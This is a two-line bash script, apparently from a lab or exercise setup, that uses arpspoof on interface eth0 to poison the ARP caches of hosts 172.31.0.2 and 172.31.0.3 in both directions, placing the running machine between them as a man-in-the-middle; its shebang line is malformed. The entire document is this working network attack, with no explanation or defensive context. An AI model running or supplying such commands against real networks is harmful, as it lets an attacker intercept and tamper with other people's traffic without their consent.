#!bin/bash

arpspoof -i "eth0" -t "172.31.0.2" "172.31.0.3"
arpspoof -i "eth0" -t "172.31.0.3" "172.31.0.2"

